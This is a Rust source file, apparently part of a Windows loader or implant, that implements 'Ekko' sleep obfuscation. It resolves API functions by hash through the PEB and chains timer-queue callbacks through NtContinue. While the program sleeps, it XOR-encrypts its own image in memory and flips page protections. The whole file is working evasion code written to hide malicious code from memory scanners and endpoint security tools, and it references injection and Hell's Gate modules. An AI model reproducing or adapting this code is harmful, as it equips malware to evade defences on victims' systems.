//! Ekko sleep obfuscation — XOR-encrypts the image, sleeps via a timer queue
//! ROP chain, then decrypts on wake-up.
//!
//! Only compiled when the `sleep_obf` feature is enabled.

#![cfg(feature = "sleep_obf")]
#![allow(dead_code, unused_imports, non_snake_case, unused_variables)]

use crate::types::*;

// ---------------------------------------------------------------------------
// External helpers (provided by the Windows loader at link time)
// ---------------------------------------------------------------------------

extern "system" {
    fn LoadLibraryA(name: *const u8) -> *mut u8;
    fn GetProcessHeap() -> HANDLE;
    fn HeapAlloc(heap: HANDLE, flags: u32, bytes: usize) -> *mut u8;
    fn HeapFree(heap: HANDLE, flags: u32, mem: *mut u8) -> i32;
}

// ---------------------------------------------------------------------------
// Function pointer types
// ---------------------------------------------------------------------------

type RtlCreateTimerQueueFn  = unsafe extern "system" fn(*mut HANDLE) -> NTSTATUS;
type RtlCreateTimerFn       = unsafe extern "system" fn(HANDLE, *mut HANDLE, usize, *mut u8, u32, u32, u32) -> NTSTATUS;
type RtlDeleteTimerQueueFn  = unsafe extern "system" fn(HANDLE) -> NTSTATUS;
type NtCreateEventFn        = unsafe extern "system" fn(*mut HANDLE, u32, *mut u8, u32, i32) -> NTSTATUS;
type NtContinueFn           = unsafe extern "system" fn(*mut Context, i32) -> NTSTATUS;
type NtSignalAndWaitFn      = unsafe extern "system" fn(HANDLE, HANDLE, i32, *mut i64) -> NTSTATUS;
type SystemFunc032Fn        = unsafe extern "system" fn(*mut Ustring, *mut Ustring) -> NTSTATUS;
type WaitForSingleObjExFn   = unsafe extern "system" fn(HANDLE, u32, i32) -> i32;
type SetEventFn             = unsafe extern "system" fn(HANDLE) -> i32;
type VirtualProtectFn       = unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32;
type RtlCaptureContextFn    = unsafe extern "system" fn(*mut Context);

// ---------------------------------------------------------------------------
// Key size — default 16 bytes (matches loader_config.h / hfbuild default)
// ---------------------------------------------------------------------------

const KEY_SIZE: usize = 16;

// ---------------------------------------------------------------------------
// ekko_sleep
// ---------------------------------------------------------------------------

/// Sleep for `ms` milliseconds while keeping the image encrypted in memory.
///
/// The technique (Ekko) chains 7 one-shot timer callbacks via ROP-style
/// `NtContinue` stubs:
///   1. Wait on a start-event
///   2. VirtualProtect RW
///   3. Encrypt with `SystemFunction032`
///   4. Wait `ms` (the actual sleep)
///   5. Decrypt with `SystemFunction032`
///   6. VirtualProtect RX
///   7. SetEvent(end)
///
/// # Safety
/// Modifies the calling process's own `.text` section protections.
pub unsafe fn ekko_sleep(ms: u32) {
    // -----------------------------------------------------------------------
    // 1. Resolve ntdll and kernel32 bases
    // -----------------------------------------------------------------------
    let h_ntdll    = crate::peb::get_module_handle_h(HASH_NTDLL);
    let h_kernel32 = crate::peb::get_module_handle_h(HASH_KERNEL32);
    if h_ntdll.is_null() || h_kernel32.is_null() {
        return;
    }

    // -----------------------------------------------------------------------
    // 2. Resolve all required function pointers by hash
    // -----------------------------------------------------------------------
    let rtl_create_timer_queue_ptr  = crate::peb::get_proc_address_h(h_ntdll,    HASH_RTL_CREATE_TIMER_QUEUE);
    let rtl_create_timer_ptr        = crate::peb::get_proc_address_h(h_ntdll,    HASH_RTL_CREATE_TIMER);
    let rtl_delete_timer_queue_ptr  = crate::peb::get_proc_address_h(h_ntdll,    HASH_RTL_DELETE_TIMER_QUEUE);
    let nt_create_event_ptr         = crate::peb::get_proc_address_h(h_ntdll,    HASH_NT_CREATE_EVENT);
    let nt_continue_ptr             = crate::peb::get_proc_address_h(h_ntdll,    HASH_NT_CONTINUE);
    let nt_signal_and_wait_ptr      = crate::peb::get_proc_address_h(h_ntdll,    HASH_NT_SIGNAL_AND_WAIT);
    let rtl_capture_ctx_ptr         = crate::peb::get_proc_address_h(h_ntdll,    HASH_RTL_CAPTURE_CONTEXT);
    let wait_for_single_obj_ex_ptr  = crate::peb::get_proc_address_h(h_kernel32, HASH_WAIT_FOR_SINGLE_OBJECT_EX);
    let set_event_ptr               = crate::peb::get_proc_address_h(h_kernel32, HASH_SET_EVENT);
    let virtual_protect_ptr         = crate::peb::get_proc_address_h(h_kernel32, HASH_VIRTUAL_PROTECT);

    if rtl_create_timer_queue_ptr.is_null()
        || rtl_create_timer_ptr.is_null()
        || rtl_delete_timer_queue_ptr.is_null()
        || nt_create_event_ptr.is_null()
        || nt_continue_ptr.is_null()
        || nt_signal_and_wait_ptr.is_null()
        || rtl_capture_ctx_ptr.is_null()
        || wait_for_single_obj_ex_ptr.is_null()
        || set_event_ptr.is_null()
        || virtual_protect_ptr.is_null()
    {
        return;
    }

    // -----------------------------------------------------------------------
    // 3. Load Cryptsp and resolve SystemFunction032
    // -----------------------------------------------------------------------
    let cryptsp_name = b"Cryptsp\0";
    let h_cryptsp = LoadLibraryA(cryptsp_name.as_ptr());
    if h_cryptsp.is_null() {
        return;
    }
    let sys_func032_ptr = crate::peb::get_proc_address_h(h_cryptsp as *mut u8, HASH_SYSTEM_FUNCTION032);
    if sys_func032_ptr.is_null() {
        return;
    }

    // -----------------------------------------------------------------------
    // 4. Get image base and size from PEB
    // -----------------------------------------------------------------------
    let peb = crate::hellsgate::get_peb();
    let p_img_base = (*peb).image_base_address;
    if p_img_base.is_null() {
        return;
    }
    let dos_hdr = p_img_base as *const ImageDosHeader;
    let nt_hdrs = (p_img_base as usize + (*dos_hdr).e_lfanew as usize) as *const ImageNtHeaders64;
    let s_img_size = (*nt_hdrs).optional_header.size_of_image as usize;

    // -----------------------------------------------------------------------
    // 5. Generate XorShift64 key from GetTickCount64
    // -----------------------------------------------------------------------
    let mut seed: u64 = (crate::inject::G_API.get_tick_count64.unwrap())();
    seed ^= seed << 13;
    seed ^= seed >> 7;
    seed ^= seed << 17;

    let mut obf_key = [0u8; KEY_SIZE];
    for i in 0..KEY_SIZE {
        obf_key[i] = (seed >> ((i % 8) * 8)) as u8;
    }

    let mut key_ustr = Ustring {
        length:         KEY_SIZE as u32,
        maximum_length: KEY_SIZE as u32,
        buffer:         obf_key.as_mut_ptr(),
    };
    let mut img_ustr = Ustring {
        length:         s_img_size as u32,
        maximum_length: s_img_size as u32,
        buffer:         p_img_base,
    };

    // -----------------------------------------------------------------------
    // 6. Create three events: start, timer, end
    // -----------------------------------------------------------------------
    let p_nt_create_event: NtCreateEventFn = core::mem::transmute(nt_create_event_ptr);

    let mut h_start_evt: HANDLE = core::ptr::null_mut();
    let mut h_timer_evt: HANDLE = core::ptr::null_mut();
    let mut h_end_evt:   HANDLE = core::ptr::null_mut();

    // SynchronizationEvent = 1, NotificationEvent = 0
    p_nt_create_event(&mut h_start_evt, EVENT_ALL_ACCESS, core::ptr::null_mut(), 1, 0);
    p_nt_create_event(&mut h_timer_evt, EVENT_ALL_ACCESS, core::ptr::null_mut(), 0, 0);
    p_nt_create_event(&mut h_end_evt,   EVENT_ALL_ACCESS, core::ptr::null_mut(), 1, 0);

    // -----------------------------------------------------------------------
    // 7. Allocate 7 × 0x1000 bytes on the heap for per-context stacks
    //    (7 * 4 KB = 28 KB — avoid blowing the current thread stack)
    // -----------------------------------------------------------------------
    let ctx_stacks = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 7 * 0x1000);
    if ctx_stacks.is_null() {
        // Cleanup events and bail
        let close_fn = crate::inject::G_API.close_handle.unwrap();
        close_fn(h_start_evt);
        close_fn(h_timer_evt);
        close_fn(h_end_evt);
        return;
    }

    // -----------------------------------------------------------------------
    // 8. Capture current context and clone to 7 frames
    // -----------------------------------------------------------------------
    let mut ctx_arr: [Context; 7] = core::mem::zeroed();

    let capture_fn: RtlCaptureContextFn = core::mem::transmute(rtl_capture_ctx_ptr);
    capture_fn(&mut ctx_arr[0]);
    for i in 1..7usize {
        ctx_arr[i] = ctx_arr[0];
    }

    // Set each context's RSP to the top of its private 4KB scratch page
    for i in 0..7usize {
        ctx_arr[i].rsp = (ctx_stacks as usize + (i + 1) * 0x1000 - 8) as u64;
    }

    // -----------------------------------------------------------------------
    // 9. VirtualProtect / SetEvent / WaitForSingleObjectEx storage for RIP
    //    (we need dw_old_prot + dw_dummy to survive until the timers fire)
    // -----------------------------------------------------------------------
    let mut dw_old_prot: u32 = 0;
    let mut dw_dummy:    u32 = 0;

    // -----------------------------------------------------------------------
    // 10. Wire up each context's RIP + arguments
    // -----------------------------------------------------------------------

    // ctx[0]: WaitForSingleObjectEx(hStartEvt, INFINITE, TRUE)
    ctx_arr[0].rip = wait_for_single_obj_ex_ptr as u64;
    ctx_arr[0].rcx = h_start_evt as u64;
    ctx_arr[0].rdx = INFINITE as u64;
    ctx_arr[0].r8  = 1; // TRUE (alertable)

    // ctx[1]: VirtualProtect(pImgBase, sImgSize, PAGE_READWRITE, &dwOldProt)
    ctx_arr[1].rip = virtual_protect_ptr as u64;
    ctx_arr[1].rcx = p_img_base as u64;
    ctx_arr[1].rdx = s_img_size as u64;
    ctx_arr[1].r8  = PAGE_READWRITE as u64;
    ctx_arr[1].r9  = &mut dw_old_prot as *mut u32 as u64;

    // ctx[2]: SystemFunction032(&Img, &Key) — encrypt
    ctx_arr[2].rip = sys_func032_ptr as u64;
    ctx_arr[2].rcx = &mut img_ustr as *mut Ustring as u64;
    ctx_arr[2].rdx = &mut key_ustr as *mut Ustring as u64;

    // ctx[3]: WaitForSingleObjectEx(hTimerEvt, dwMs, TRUE) — actual sleep
    ctx_arr[3].rip = wait_for_single_obj_ex_ptr as u64;
    ctx_arr[3].rcx = h_timer_evt as u64;
    ctx_arr[3].rdx = ms as u64;
    ctx_arr[3].r8  = 1; // TRUE (alertable)

    // ctx[4]: SystemFunction032(&Img, &Key) — decrypt (same op = XOR again)
    ctx_arr[4].rip = sys_func032_ptr as u64;
    ctx_arr[4].rcx = &mut img_ustr as *mut Ustring as u64;
    ctx_arr[4].rdx = &mut key_ustr as *mut Ustring as u64;

    // ctx[5]: VirtualProtect(pImgBase, sImgSize, PAGE_EXECUTE_READ, &dwDummy)
    ctx_arr[5].rip = virtual_protect_ptr as u64;
    ctx_arr[5].rcx = p_img_base as u64;
    ctx_arr[5].rdx = s_img_size as u64;
    ctx_arr[5].r8  = PAGE_EXECUTE_READ as u64;
    ctx_arr[5].r9  = &mut dw_dummy as *mut u32 as u64;

    // ctx[6]: SetEvent(hEndEvt)
    ctx_arr[6].rip = set_event_ptr as u64;
    ctx_arr[6].rcx = h_end_evt as u64;

    // -----------------------------------------------------------------------
    // 11. Create timer queue and register 7 one-shot timers
    // -----------------------------------------------------------------------
    let rtl_create_timer_queue: RtlCreateTimerQueueFn = core::mem::transmute(rtl_create_timer_queue_ptr);
    let rtl_create_timer:       RtlCreateTimerFn      = core::mem::transmute(rtl_create_timer_ptr);

    let mut h_queue: HANDLE = core::ptr::null_mut();
    rtl_create_timer_queue(&mut h_queue);

    // Due times (ms): 100, 200, 300, 300+ms, 400+ms, 500+ms, 600+ms
    let due_times: [u32; 7] = [
        100,
        200,
        300,
        300u32.wrapping_add(ms),
        400u32.wrapping_add(ms),
        500u32.wrapping_add(ms),
        600u32.wrapping_add(ms),
    ];

    let nt_continue_fn_ptr = nt_continue_ptr as usize;
    let mut h_timers: [HANDLE; 7] = [core::ptr::null_mut(); 7];

    for i in 0..7usize {
        rtl_create_timer(
            h_queue,
            &mut h_timers[i],
            nt_continue_fn_ptr,                      // WAITORTIMERCALLBACK = NtContinue
            &mut ctx_arr[i] as *mut Context as *mut u8,
            due_times[i],
            0,                                        // period = 0 (one-shot)
            WT_EXECUTEINTIMERTHREAD,
        );
    }

    // -----------------------------------------------------------------------
    // 12. Signal start-event, wait for end-event (blocks until chain fires)
    // -----------------------------------------------------------------------
    let p_nt_signal_and_wait: NtSignalAndWaitFn = core::mem::transmute(nt_signal_and_wait_ptr);
    p_nt_signal_and_wait(h_start_evt, h_end_evt, 0 /* non-alertable */, core::ptr::null_mut());

    // -----------------------------------------------------------------------
    // 13. Cleanup
    // -----------------------------------------------------------------------
    let rtl_delete_timer_queue: RtlDeleteTimerQueueFn = core::mem::transmute(rtl_delete_timer_queue_ptr);
    rtl_delete_timer_queue(h_queue);

    HeapFree(GetProcessHeap(), 0, ctx_stacks);

    let close_fn = crate::inject::G_API.close_handle.unwrap();
    close_fn(h_end_evt);
    close_fn(h_timer_evt);
    close_fn(h_start_evt);
}
